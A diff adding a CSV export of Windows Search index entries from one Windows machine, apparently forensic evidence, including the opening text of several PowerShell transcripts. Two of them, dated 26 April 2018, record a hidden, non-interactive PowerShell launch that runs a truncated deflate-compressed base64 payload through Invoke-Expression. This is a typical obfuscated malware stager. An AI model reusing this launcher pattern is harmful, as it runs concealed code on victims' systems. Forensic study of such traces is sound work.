@@ -1,0 +1,766 @@
+0F-InvertedOnlyMD5,0-InvertedOnlyPids,11-System_FileName,13F-System_Size,14F-System_FileAttributes,15F-System_DateModified,16F-System_DateCreated,17F-System_DateAccessed,33-System_ItemUrl,3-System_ItemFolderNameDisplay,4165-System_ComputerName,4334-System_ContentType,4346-System_DateImported,4352-System_Document_DateCreated,4354-System_Document_DateSaved,4373-System_FileExtension,4377-System_FileOwner,4378-System_FilePlaceholderStatus,4410-System_IsAttachment,4412-System_IsEncrypted,4415-System_IsFolder,4419-System_ItemDate,4421-System_ItemFolderPathDisplay,4422-System_ItemFolderPathDisplayNarrow,4423-System_ItemName,4424-System_ItemNameDisplay,4425-System_ItemNameDisplayWithoutExtension,4428-System_ItemPathDisplay,4429-System_ItemPathDisplayNarrow,4431-System_ItemType,4437-System_Kind,4438-System_KindText,4453-System_MIMEType,4540-System_NotUserContent,4546-System_ParsingName,4604-System_SFGAOFlags,4605-System_Search_AccessCount,4606-System_Search_AutoSummary,4612F-System_Search_GatherTime,4614-System_Search_LastIndexedTotalTime,4618-System_Search_Store,4655-System_ThumbnailCacheId,4679-System_VolumeId,5-System_ItemTypeText,WorkID
+"706A5762DF4DD12D8AFB9EDD49F4F0AA","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.lNCjFjAO.20180417180036.txt","3492","Archive (32)","18/04/2018 00:00:48.2819689","18/04/2018 00:00:37.1883037","18/04/2018 00:00:37.1883037","file:C:/Users/maxpowers/Documents/20180417/PowerShell_transcript.DESKTOP-EDSLQM8.lNCjFjAO.20180417180036.txt","20180417","DESKTOP-EDSLQM8","text/plain","18/04/2018 00:00:38.0000000","18/04/2018 00:00:38.0000000","18/04/2018 00:00:48.2819689",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","18/04/2018 00:00:48.2819689","C:\Users\maxpowers\Documents\20180417","20180417 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.lNCjFjAO.20180417180036.txt","PowerShell_transcript.DESKTOP-EDSLQM8.lNCjFjAO.20180417180036.txt","PowerShell_transcript.DESKTOP-EDSLQM8.lNCjFjAO.20180417180036","C:\Users\maxpowers\Documents\20180417\PowerShell_transcript.DESKTOP-EDSLQM8.lNCjFjAO.20180417180036.txt","PowerShell_transcript.DESKTOP-EDSLQM8.lNCjFjAO.20180417180036 (C:\Users\maxpowers\Documents\20180417)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.lNCjFjAO.20180417180036.txt","1077936503","0","**********************
+Windows PowerShell transcript start
+Start time: 20180417180037
+Username: DESKTOP-EDSLQM8\maxpowers
+RunAs User: DESKTOP-EDSLQM8\maxpowers
+Configuration Name: 
+Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
+Host Application: C:\WINDOWS\System32\sdiagnhost.exe -Embedding
+Process ID: 7640
+PSVersion: 5.1.16299.251
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
+BuildVersion: 10.0.16299.251
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>CommandInvocation(Set-Location): ""Set-Location""
+>> ParameterBinding(Set-Location): name=""Path""; value=""C:\WINDOWS\TEMP\SDIAG_f4114cff-e1d6-4eb7-9cac-b44b95e644b6""
+PS>& ""C:\WINDOWS\TEMP\SDIAG_f4114cff-e1d6-4eb7-9cac-b44b95e644b6\TS_WERQueue.ps1""
+**********************
+Windows PowerShell transcript start
+Start time: 20180417180044
+Username: DESKTOP-EDSLQM8\maxpowers
+RunAs User: DESKTOP-EDSLQM8\maxpowers","18/04/2018 00:00:48.3600177","0,03125","file","06180A08F6129149","804cb650-0000-0000-0000-501f00000000","Text Document","75"
+"DE7A37D1CDFA3C1E013285A8E884972E","140015124E12","CreativeCommonsLisense.txt","483","Archive (32)","12/03/2018 23:43:15.3218847","12/03/2018 23:43:15.2907922","12/03/2018 23:43:15.2907922","file:C:/Users/maxpowers/Desktop/testing/geodb/CreativeCommonsLisense.txt","geodb","DESKTOP-EDSLQM8","text/plain","12/03/2018 23:43:15.3218847","12/03/2018 23:43:15.3218847","12/03/2018 23:43:15.3218847",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","12/03/2018 23:43:15.3218847","C:\Users\maxpowers\Desktop\testing\geodb","geodb (C:\Users\maxpowers\Desktop\testing)","CreativeCommonsLisense.txt","CreativeCommonsLisense.txt","CreativeCommonsLisense","C:\Users\maxpowers\Desktop\testing\geodb\CreativeCommonsLisense.txt","CreativeCommonsLisense (C:\Users\maxpowers\Desktop\testing\geodb)",".txt","document","Document","text/plain","False","CreativeCommonsLisense.txt","1077936503","0","The GeoLite2 databases are distributed under the Creative Commons Attribution-ShareAlike 4.0 International License.
+        The attribution requirement may be met by including the following in all advertising and documentation mentioning
+        features of or use of this database:
+        This product includes GeoLite2 data created by MaxMind, available from http://www.maxmind.com.
+        
+        See license at https://creativecommons.org/licenses/by-sa/4.0/legalcode","13/03/2018 18:17:25.1786301","0","file","E8C2C5869F466FA4","804cb650-0000-0000-0000-501f00000000","Text Document","115"
+"E295E51D990000F119EF12A808BF1372","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.u99e+n1x.20180426095820.txt","3709","Archive (32)","26/04/2018 15:59:36.3294054","26/04/2018 15:58:20.5168826","26/04/2018 15:58:20.5168826","file:C:/Users/maxpowers/Documents/20180426/PowerShell_transcript.DESKTOP-EDSLQM8.u99e+n1x.20180426095820.txt","20180426","DESKTOP-EDSLQM8","text/plain","26/04/2018 15:58:22.0000000","26/04/2018 15:58:22.0000000","26/04/2018 15:59:36.3294054",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","26/04/2018 15:59:36.3294054","C:\Users\maxpowers\Documents\20180426","20180426 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.u99e+n1x.20180426095820.txt","PowerShell_transcript.DESKTOP-EDSLQM8.u99e+n1x.20180426095820.txt","PowerShell_transcript.DESKTOP-EDSLQM8.u99e+n1x.20180426095820","C:\Users\maxpowers\Documents\20180426\PowerShell_transcript.DESKTOP-EDSLQM8.u99e+n1x.20180426095820.txt","PowerShell_transcript.DESKTOP-EDSLQM8.u99e+n1x.20180426095820 (C:\Users\maxpowers\Documents\20180426)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.u99e+n1x.20180426095820.txt","1077936503","0","**********************
+Windows PowerShell transcript start
+Start time: 20180426095820
+Username: DESKTOP-EDSLQM8\maxpowers
+RunAs User: DESKTOP-EDSLQM8\maxpowers
+Configuration Name: 
+Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
+Host Application: C:\Windows\syswow64\windowspowershell\v1.0\powershell.exe -NoP -NonI -W Hidden -Command Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String("" pVZNj9s2EL37VxCGDjbWWlAS9eEYCyRtUCBAkQbdbXswfKAoqiuUlgSJzno37X8vZyRS1joBivQy5HCGb97MUKQ8Qe7I2+Vi/16pD8e26fRq+Zfsaqmi8LZQark+kPaUq0qQXnNtBnnWxk4+1PqT7sjvVadPXL1TqhGrce1pQ05Vrcl5HJ/H8WW9++44P3aSa/nwaIbCxjmNuJ83ZIo8zi5ijyuvox/7z6LT/yX2UR57qVfXyN+fVd40ytbuU9doKRy+at8VRSf7fsQvnu6rFzkqpfoon8YNG9Kc9LCs2lL9oorRYAgt3y68xnTWQPkPz60kvkkil917WVZ1paumJp4g/kd+lGT5R1VH4ZL4tdH6lgtJcOWnUy3Asyd+y/teP3anhXe+85o3b2Zdpxt6DiiFIRoGytY7sv/hWcv94eD1cMTouRTGIjMjshB86EwkILItuMQAFBgh0MDAkBsRDxGciihipgbOOQU1hGi0NCJPjWAc1hILX4KBA0AEIoG1FGY","26/04/2018 15:59:36.5169373","0,046875","file","BD6A609605E4D885","804cb650-0000-0000-0000-501f00000000","Text Document","1027"
+"FCD036C18D8BEFACDE6297B6DE7C7178","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.hd+2+jd_.20180426100139.txt","3709","Archive (32)","26/04/2018 16:01:45.7044938","26/04/2018 16:01:39.1887638","26/04/2018 16:01:39.1887638","file:C:/Users/maxpowers/Documents/20180426/PowerShell_transcript.DESKTOP-EDSLQM8.hd+2+jd_.20180426100139.txt","20180426","DESKTOP-EDSLQM8","text/plain","26/04/2018 16:01:40.0000000","26/04/2018 16:01:40.0000000","26/04/2018 16:01:45.7044938",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","26/04/2018 16:01:45.7044938","C:\Users\maxpowers\Documents\20180426","20180426 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.hd+2+jd_.20180426100139.txt","PowerShell_transcript.DESKTOP-EDSLQM8.hd+2+jd_.20180426100139.txt","PowerShell_transcript.DESKTOP-EDSLQM8.hd+2+jd_.20180426100139","C:\Users\maxpowers\Documents\20180426\PowerShell_transcript.DESKTOP-EDSLQM8.hd+2+jd_.20180426100139.txt","PowerShell_transcript.DESKTOP-EDSLQM8.hd+2+jd_.20180426100139 (C:\Users\maxpowers\Documents\20180426)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.hd+2+jd_.20180426100139.txt","1077936503","0","**********************
+Windows PowerShell transcript start
+Start time: 20180426100139
+Username: DESKTOP-EDSLQM8\maxpowers
+RunAs User: DESKTOP-EDSLQM8\maxpowers
+Configuration Name: 
+Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
+Host Application: C:\Windows\syswow64\windowspowershell\v1.0\powershell.exe -NoP -NonI -W Hidden -Command Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String("" pVZNj9s2EL37VxCGDjbWWlAS9eEYCyRtUCBAkQbdbXswfKAoqiuUlgSJzno37X8vZyRS1joBivQy5HCGb97MUKQ8Qe7I2+Vi/16pD8e26fRq+Zfsaqmi8LZQark+kPaUq0qQXnNtBnnWxk4+1PqT7sjvVadPXL1TqhGrce1pQ05Vrcl5HJ/H8WW9++44P3aSa/nwaIbCxjmNuJ83ZIo8zi5ijyuvox/7z6LT/yX2UR57qVfXyN+fVd40ytbuU9doKRy+at8VRSf7fsQvnu6rFzkqpfoon8YNG9Kc9LCs2lL9oorRYAgt3y68xnTWQPkPz60kvkkil917WVZ1paumJp4g/kd+lGT5R1VH4ZL4tdH6lgtJcOWnUy3Asyd+y/teP3anhXe+85o3b2Zdpxt6DiiFIRoGytY7sv/hWcv94eD1cMTouRTGIjMjshB86EwkILItuMQAFBgh0MDAkBsRDxGciihipgbOOQU1hGi0NCJPjWAc1hILX4KBA0AEIoG1FGY","26/04/2018 16:02:13.5168787","0,03125","file","83B57CCBAD45C5D7","804cb650-0000-0000-0000-501f00000000","Text Document","1036"
+"D18D8237058F27329AC63C90DEDF5BF0","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.UutyVQEs.20180424200119.txt","3492","Archive (32)","25/04/2018 02:01:22.5689983","25/04/2018 02:01:19.7566972","25/04/2018 02:01:19.7566972","file:C:/Users/maxpowers/Documents/20180424/PowerShell_transcript.DESKTOP-EDSLQM8.UutyVQEs.20180424200119.txt","20180424","DESKTOP-EDSLQM8","text/plain","25/04/2018 02:01:20.0000000","25/04/2018 02:01:20.0000000","25/04/2018 02:01:22.5689983",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","25/04/2018 02:01:22.5689983","C:\Users\maxpowers\Documents\20180424","20180424 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.UutyVQEs.20180424200119.txt","PowerShell_transcript.DESKTOP-EDSLQM8.UutyVQEs.20180424200119.txt","PowerShell_transcript.DESKTOP-EDSLQM8.UutyVQEs.20180424200119","C:\Users\maxpowers\Documents\20180424\PowerShell_transcript.DESKTOP-EDSLQM8.UutyVQEs.20180424200119.txt","PowerShell_transcript.DESKTOP-EDSLQM8.UutyVQEs.20180424200119 (C:\Users\maxpowers\Documents\20180424)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.UutyVQEs.20180424200119.txt","1077936503","0","**********************
+Windows PowerShell transcript start
+Start time: 20180424200119
+Username: DESKTOP-EDSLQM8\maxpowers
+RunAs User: DESKTOP-EDSLQM8\maxpowers
+Configuration Name: 
+Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
+Host Application: C:\WINDOWS\System32\sdiagnhost.exe -Embedding
+Process ID: 3748
+PSVersion: 5.1.16299.251
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
+BuildVersion: 10.0.16299.251
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>CommandInvocation(Set-Location): ""Set-Location""
+>> ParameterBinding(Set-Location): name=""Path""; value=""C:\WINDOWS\TEMP\SDIAG_8e0546f4-e6d9-467c-8529-c7cb7bd3c437""
+PS>& ""C:\WINDOWS\TEMP\SDIAG_8e0546f4-e6d9-467c-8529-c7cb7bd3c437\TS_WERQueue.ps1""
+**********************
+Windows PowerShell transcript start
+Start time: 20180424200121
+Username: DESKTOP-EDSLQM8\maxpowers
+RunAs User: DESKTOP-EDSLQM8\maxpowers","25/04/2018 02:01:22.6158517","0,015625","file","52B7282C3FC6D6B5","804cb650-0000-0000-0000-501f00000000","Text Document","1045"
+"755C6A08828B362545A075815FCF78A1","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.red7JjgD.20180316135951.txt","717","Archive (32)","16/03/2018 19:59:55.1803578","16/03/2018 19:59:51.8207286","16/03/2018 19:59:51.8207286","file:C:/Users/maxpowers/Documents/20180316/PowerShell_transcript.DESKTOP-EDSLQM8.red7JjgD.20180316135951.txt","20180316","DESKTOP-EDSLQM8","text/plain","16/03/2018 19:59:52.0000000","16/03/2018 19:59:52.0000000","16/03/2018 19:59:55.1803578",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","16/03/2018 19:59:55.1803578","C:\Users\maxpowers\Documents\20180316","20180316 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.red7JjgD.20180316135951.txt","PowerShell_transcript.DESKTOP-EDSLQM8.red7JjgD.20180316135951.txt","PowerShell_transcript.DESKTOP-EDSLQM8.red7JjgD.20180316135951","C:\Users\maxpowers\Documents\20180316\PowerShell_transcript.DESKTOP-EDSLQM8.red7JjgD.20180316135951.txt","PowerShell_transcript.DESKTOP-EDSLQM8.red7JjgD.20180316135951 (C:\Users\maxpowers\Documents\20180316)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.red7JjgD.20180316135951.txt","1077936503","0","**********************
+Windows PowerShell transcript start
+Start time: 20180316135951
+Username: DESKTOP-EDSLQM8\maxpowers
+RunAs User: DESKTOP-EDSLQM8\maxpowers
+Configuration Name: 
+Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
+Host Application: PowerShell.exe -noexit -command Set-Location -literalPath 'C:\Users\maxpowers\Documents'
+Process ID: 4216
+PSVersion: 5.1.16299.251
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
+BuildVersion: 10.0.16299.251
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>Set-Location -literalPath 'C:\Users\maxpowers\Documents'
+","16/03/2018 19:59:55.9780827","0,015625","file","0F161102B7625BE9","804cb650-0000-0000-0000-501f00000000","Text Document","2078"
+"19D36CCFC5AC96A71828DB044BAE52E3","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.gki3LtgZ.20180316140001.txt","691","Archive (32)","16/03/2018 20:00:02.4924318","16/03/2018 20:00:01.7269779","16/03/2018 20:00:01.7269779","file:C:/Users/maxpowers/Documents/20180316/PowerShell_transcript.DESKTOP-EDSLQM8.gki3LtgZ.20180316140001.txt","20180316","DESKTOP-EDSLQM8","text/plain","16/03/2018 20:00:02.0000000","16/03/2018 20:00:02.0000000","16/03/2018 20:00:02.4924318",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","16/03/2018 20:00:02.4924318","C:\Users\maxpowers\Documents\20180316","20180316 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.gki3LtgZ.20180316140001.txt","PowerShell_transcript.DESKTOP-EDSLQM8.gki3LtgZ.20180316140001.txt","PowerShell_transcript.DESKTOP-EDSLQM8.gki3LtgZ.20180316140001","C:\Users\maxpowers\Documents\20180316\PowerShell_transcript.DESKTOP-EDSLQM8.gki3LtgZ.20180316140001.txt","PowerShell_transcript.DESKTOP-EDSLQM8.gki3LtgZ.20180316140001 (C:\Users\maxpowers\Documents\20180316)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.gki3LtgZ.20180316140001.txt","1077936503","0","**********************
+Windows PowerShell transcript start
+Start time: 20180316140001
+Username: DESKTOP-EDSLQM8\maxpowers
+RunAs User: DESKTOP-EDSLQM8\maxpowers
+Configuration Name: 
+Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
+Host Application: PowerShell.exe -noexit -command Set-Location 'C:\Users\maxpowers\Documents'
+Process ID: 4976
+PSVersion: 5.1.16299.251
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
+BuildVersion: 10.0.16299.251
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>Set-Location 'C:\Users\maxpowers\Documents'
+","16/03/2018 20:00:02.9454819","0,015625","file","18F170E804E7CACB","804cb650-0000-0000-0000-501f00000000","Text Document","2079"
+"84FD18D002D9672F3F8D44CE748E2BFF","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8._BT7GQuB.20180316140006.txt","46131056","Archive (32)","16/03/2018 20:15:23.7112032","16/03/2018 20:00:06.9144064","16/03/2018 20:00:06.9144064","file:C:/Users/maxpowers/Documents/20180316/PowerShell_transcript.DESKTOP-EDSLQM8._BT7GQuB.20180316140006.txt","20180316","DESKTOP-EDSLQM8","text/plain","16/03/2018 20:00:08.0000000","16/03/2018 20:00:08.0000000","16/03/2018 20:15:23.7112032",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","16/03/2018 20:15:23.7112032","C:\Users\maxpowers\Documents\20180316","20180316 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8._BT7GQuB.20180316140006.txt","PowerShell_transcript.DESKTOP-EDSLQM8._BT7GQuB.20180316140006.txt","PowerShell_transcript.DESKTOP-EDSLQM8._BT7GQuB.20180316140006","C:\Users\maxpowers\Documents\20180316\PowerShell_transcript.DESKTOP-EDSLQM8._BT7GQuB.20180316140006.txt","PowerShell_transcript.DESKTOP-EDSLQM8._BT7GQuB.20180316140006 (C:\Users\maxpowers\Documents\20180316)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8._BT7GQuB.20180316140006.txt","1077936503","0","**********************
+Windows PowerShell transcript start
+Start time: 20180316140006
+Username: DESKTOP-EDSLQM8\maxpowers
+RunAs User: DESKTOP-EDSLQM8\maxpowers
+Configuration Name: 
+Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
+Host Application: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noexit -command Set-Location -literalPath 'C:\Users\maxpowers\Documents'
+Process ID: 4564
+PSVersion: 5.1.16299.251
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
+BuildVersion: 10.0.16299.251
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>Set-Location -literalPath 'C:\Users\maxpowers\Documents'
+PS C:\Users\maxpowers\Documents> ifind -h
+Invalid argument: (null)
+usage: C:\Tools\sleuthkit-4.6.0-win32\bin\ifind.exe [-alvV] [-f fstype] [-i imgtype] [-b dev_sector_size] [-o imgoffset]
+ [-d unit_addr] [-n file] [-p par_addr] [-z ZONE] image [images]
+        -a","16/03/2018 20:21:51.2119238","0,03125","file","34D20AC04725A06D","804cb650-0000-0000-0000-501f00000000","Text Document","2081"
+"AF3A2C7016CE96BFFF7436438EB1975D","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.HOEdn55c.20180316143118.txt","711","Archive (32)","16/03/2018 20:31:23.0080368","16/03/2018 20:31:18.8987349","16/03/2018 20:31:18.8987349","file:C:/Users/maxpowers/Documents/20180316/PowerShell_transcript.DESKTOP-EDSLQM8.HOEdn55c.20180316143118.txt","20180316","DESKTOP-EDSLQM8","text/plain","16/03/2018 20:31:20.0000000","16/03/2018 20:31:20.0000000","16/03/2018 20:31:23.0080368",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","16/03/2018 20:31:23.0080368","C:\Users\maxpowers\Documents\20180316","20180316 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.HOEdn55c.20180316143118.txt","PowerShell_transcript.DESKTOP-EDSLQM8.HOEdn55c.20180316143118.txt","PowerShell_transcript.DESKTOP-EDSLQM8.HOEdn55c.20180316143118","C:\Users\maxpowers\Documents\20180316\PowerShell_transcript.DESKTOP-EDSLQM8.HOEdn55c.20180316143118.txt","PowerShell_transcript.DESKTOP-EDSLQM8.HOEdn55c.20180316143118 (C:\Users\maxpowers\Documents\20180316)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.HOEdn55c.20180316143118.txt","1077936503","0","**********************
+Windows PowerShell transcript start
+Start time: 20180316143118
+Username: DESKTOP-EDSLQM8\maxpowers
+RunAs User: DESKTOP-EDSLQM8\maxpowers
+Configuration Name: 
+Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
+Host Application: PowerShell.exe -noexit -command Set-Location 'C:\Projects\ProjectU'
+Process ID: 8184
+PSVersion: 5.1.16299.251
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
+BuildVersion: 10.0.16299.251
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>Set-Location 'C:\Projects\ProjectU'
+PS C:\Projects\ProjectU> start cmd
+","16/03/2018 20:31:23.4455602","0,125","file","88047DA5EDCB07BC","804cb650-0000-0000-0000-501f00000000","Text Document","2086"
+"D8E7A382F55689CFBA58D6B5B757AF75","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.NRk3A31f.20180327134015.txt","3492","Archive (32)","27/03/2018 19:40:19.4923758","27/03/2018 19:40:15.9626230","27/03/2018 19:40:15.9626230","file:C:/Users/maxpowers/Documents/20180327/PowerShell_transcript.DESKTOP-EDSLQM8.NRk3A31f.20180327134015.txt","20180327","DESKTOP-EDSLQM8","text/plain","27/03/2018 19:40:16.0000000","27/03/2018 19:40:16.0000000","27/03/2018 19:40:19.4923758",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","27/03/2018 19:40:19.4923758","C:\Users\maxpowers\Documents\20180327","20180327 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.NRk3A31f.20180327134015.txt","PowerShell_transcript.DESKTOP-EDSLQM8.NRk3A31f.20180327134015.txt","PowerShell_transcript.DESKTOP-EDSLQM8.NRk3A31f.20180327134015","C:\Users\maxpowers\Documents\20180327\PowerShell_transcript.DESKTOP-EDSLQM8.NRk3A31f.20180327134015.txt","PowerShell_transcript.DESKTOP-EDSLQM8.NRk3A31f.20180327134015 (C:\Users\maxpowers\Documents\20180327)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.NRk3A31f.20180327134015.txt","1077936503","0","**********************
+Windows PowerShell transcript start
+Start time: 20180327134015
+Username: DESKTOP-EDSLQM8\maxpowers
+RunAs User: DESKTOP-EDSLQM8\maxpowers
+Configuration Name: 
+Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
+Host Application: C:\WINDOWS\System32\sdiagnhost.exe -Embedding
+Process ID: 7260
+PSVersion: 5.1.16299.251
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
+BuildVersion: 10.0.16299.251
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>CommandInvocation(Set-Location): ""Set-Location""
+>> ParameterBinding(Set-Location): name=""Path""; value=""C:\WINDOWS\TEMP\SDIAG_f2d2ad61-3960-4205-b55c-45c8e34a19ad""
+PS>& ""C:\WINDOWS\TEMP\SDIAG_f2d2ad61-3960-4205-b55c-45c8e34a19ad\TS_WERQueue.ps1""
+**********************
+Windows PowerShell transcript start
+Start time: 20180327134018
+Username: DESKTOP-EDSLQM8\maxpowers
+RunAs User: DESKTOP-EDSLQM8\maxpowers","27/03/2018 19:40:20.4610646","0,0625","file","CFECF4861871F16F","804cb650-0000-0000-0000-501f00000000","Text Document","2323"
+"D978B65FC2852C55D6A4196493089AA7","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.mqA+0ycu.20180319101421.txt","1100","Archive (32)","19/03/2018 16:14:22.5039620","19/03/2018 16:14:22.2295252","19/03/2018 16:14:22.2295252","file:C:/Users/maxpowers/Documents/20180319/PowerShell_transcript.DESKTOP-EDSLQM8.mqA+0ycu.20180319101421.txt","20180319","DESKTOP-EDSLQM8","text/plain","19/03/2018 16:14:22.5039620","19/03/2018 16:14:22.5039620","19/03/2018 16:14:22.5039620",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","19/03/2018 16:14:22.5039620","C:\Users\maxpowers\Documents\20180319","20180319 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.mqA+0ycu.20180319101421.txt","PowerShell_transcript.DESKTOP-EDSLQM8.mqA+0ycu.20180319101421.txt","PowerShell_transcript.DESKTOP-EDSLQM8.mqA+0ycu.20180319101421","C:\Users\maxpowers\Documents\20180319\PowerShell_transcript.DESKTOP-EDSLQM8.mqA+0ycu.20180319101421.txt","PowerShell_transcript.DESKTOP-EDSLQM8.mqA+0ycu.20180319101421 (C:\Users\maxpowers\Documents\20180319)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.mqA+0ycu.20180319101421.txt","1077936503","0","**********************
+Windows PowerShell transcript start
+Start time: 20180319101422
+Username: DESKTOP-EDSLQM8\maxpowers
+RunAs User: DESKTOP-EDSLQM8\maxpowers
+Configuration Name: 
+Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
+Host Application: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -noprofile -ExecutionPolicy RemoteSigned -command [Console]::OutputEncoding=[System.Text.Encoding]::UTF8
+$output=[environment]::GetEnvironmentVariable('Path','User')
+[Console]::WriteLine($output)
+Process ID: 2940
+PSVersion: 5.1.16299.251
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
+BuildVersion: 10.0.16299.251
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>[Console]::OutputEncoding=[System.Text.Encoding]::UTF8
+$output=[environment]::GetEnvironmentVariable('Path','User')
+[Console]::WriteLine($output)
+PS>$global:?
+True
+**********************
+Windows Powe","19/03/2018 16:14:52.8945689","0,015625","file","43C5BBFBECFA92AA","804cb650-0000-0000-0000-501f00000000","Text Document","2331"
+"8D53167FEFE45A589D1973784F5EB0E3","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.I8VuZMDY.20180319101703.txt","1100","Archive (32)","19/03/2018 16:17:04.0849942","19/03/2018 16:17:03.8721130","19/03/2018 16:17:03.8721130","file:C:/Users/maxpowers/Documents/20180319/PowerShell_transcript.DESKTOP-EDSLQM8.I8VuZMDY.20180319101703.txt","20180319","DESKTOP-EDSLQM8","text/plain","19/03/2018 16:17:04.0000000","19/03/2018 16:17:04.0000000","19/03/2018 16:17:04.0849942",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","19/03/2018 16:17:04.0849942","C:\Users\maxpowers\Documents\20180319","20180319 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.I8VuZMDY.20180319101703.txt","PowerShell_transcript.DESKTOP-EDSLQM8.I8VuZMDY.20180319101703.txt","PowerShell_transcript.DESKTOP-EDSLQM8.I8VuZMDY.20180319101703","C:\Users\maxpowers\Documents\20180319\PowerShell_transcript.DESKTOP-EDSLQM8.I8VuZMDY.20180319101703.txt","PowerShell_transcript.DESKTOP-EDSLQM8.I8VuZMDY.20180319101703 